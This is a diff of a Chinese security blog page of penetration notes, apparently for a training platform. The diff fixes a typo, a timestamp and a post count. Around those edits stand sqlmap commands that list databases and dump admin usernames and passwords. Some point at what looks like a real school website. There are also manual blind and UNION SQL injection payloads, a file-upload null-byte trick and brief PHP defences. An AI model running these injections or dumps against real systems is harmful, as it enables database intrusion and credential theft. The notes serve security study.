@@ -86,7 +86,7 @@
 <meta property="og:site_name" content="Jason&#39;s sky">
 <meta property="og:description" content="SVN信息漏洞Subversion URL后面加.svn/entries访问，如存在漏洞可显示成功 svn1.7及以后版本则只在项目根目录生成一个.svn文件夹，目录内容有wc.db文件管理。查看内容 Web文件上传漏洞 0X00截断漏洞(http://xx/upfiles/lubr.php.jpg “.”换成0X00，“.”的ASII码值为0x2e)     构造服务器端扩展名检测上传（lubr">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-10-01T09:17:51.084Z">
+<meta property="og:updated_time" content="2018-10-29T15:40:39.290Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="墨者学院">
 <meta name="twitter:description" content="SVN信息漏洞Subversion URL后面加.svn/entries访问，如存在漏洞可显示成功 svn1.7及以后版本则只在项目根目录生成一个.svn文件夹，目录内容有wc.db文件管理。查看内容 Web文件上传漏洞 0X00截断漏洞(http://xx/upfiles/lubr.php.jpg “.”换成0X00，“.”的ASII码值为0x2e)     构造服务器端扩展名检测上传（lubr">
@@ -384,7 +384,7 @@
 <h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><p><strong>注入技术：盲推理SQL注入，UNION查询SQL注入，堆查询和基于时间的SQL盲注入</strong></p>
 <p>检查注入点<br>sqlmap.py -u “<a href="http://www.scshlx.com/TeachView.asp?id=21&quot;" target="_blank" rel="noopener">http://www.scshlx.com/TeachView.asp?id=21&quot;</a><br>列数据库/表<br>sqlmap -u “” –dbs/–tables/<br>列字段<br>sqlmap -u “” -T “指定表名admin” –columns<br>指定库表段列出内容<br>sqlmap -u “” –dump -T “admin” -C “username,password”<br>查询所有字段<br>sqlmap -u “” –tables –columns<br>mysql注入<br>–dbs –current-db –users –current-user –tables-D<br>-T””-D””–colums    </p>
 <p>脱裤<br>-dump-all    </p>
-<h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><p>‘ /and 1=1/and 1=2猜注入点<br>and exists(select * from admin)猜表名<br>and exists(selest admin from admin)猜列名<br>and(select top 1 len(admin) from admin &gt;1))猜字段长度<br>and(select top 1 asc(mid(admin,1,1)) from admin&gt;97)猜字段字符ASII    </p>
+<h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><p>‘ /and 1=1/and 1=2猜注入点<br>and exists(select * from admin)猜表名<br>and exists(select admin from admin)猜列名<br>and(select top 1 len(admin) from admin &gt;1))猜字段长度<br>and(select top 1 asc(mid(admin,1,1)) from admin&gt;97)猜字段字符ASII    </p>
 <p>union 手工，先order by 1++;猜字段长度。<br>select 1,2…. from admin 猜字段编号<br>select 1,admin,password,… 爆名和密码    </p>
 <p>@@global.version_compile_os from mysql.user() – 猜os<br>1’ and 1=2 union select 1,schema_name from information_schema.schemata – 爆所有库名    </p>
 <p>预防数据库攻击<br>mysql_real_escape_string()转义字符串中的特殊字符<br>stripslashes($value)去除斜杠<br>is_numeric($id)检查id是否为数字    </p>
@@ -558,7 +558,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-count">43</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
